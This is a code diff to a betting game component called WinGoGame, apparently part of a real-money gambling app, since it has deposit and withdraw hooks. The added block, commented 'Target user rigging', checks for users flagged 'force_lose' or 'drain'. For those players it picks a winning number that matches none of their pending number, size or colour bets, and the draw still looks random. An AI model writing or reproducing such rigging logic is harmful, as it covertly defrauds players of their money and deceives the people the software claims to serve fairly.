@@ -181,6 +181,25 @@ export default function WinGoGame({ onOpenDeposit, onOpenWithdraw, onBack, initi
       }
     }
 
+    // Target user rigging: If user has strict drain / force lose active, steer result so user loses
+    if (user?.force_result === 'force_lose' || user?.luck_mode === 'drain') {
+      const userActiveBets = (betsByMode[modeKey] || []).filter(b => b.period === pId && b.status === 'pending');
+      if (userActiveBets.length > 0) {
+        const safeLosingNums = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].filter(n => {
+          const s = n >= 5 ? 'Big' : 'Small';
+          const c = n === 0 ? 'violet-red' : n === 5 ? 'violet-green' : [2, 4, 6, 8].includes(n) ? 'red' : 'green';
+          return !userActiveBets.some(b => 
+            (b.type === 'number' && b.value === n) ||
+            (b.type === 'size' && b.value === s) ||
+            (b.type === 'color' && (b.value === c || c.includes(b.value)))
+          );
+        });
+        if (safeLosingNums.length > 0) {
+          winningNum = safeLosingNums[Math.floor(Math.random() * safeLosingNums.length)];
+        }
+      }
+    }
+
     const size = winningNum >= 5 ? 'Big' : 'Small';
     let color = 'green';
     if (winningNum === 0) color = 'violet-red';
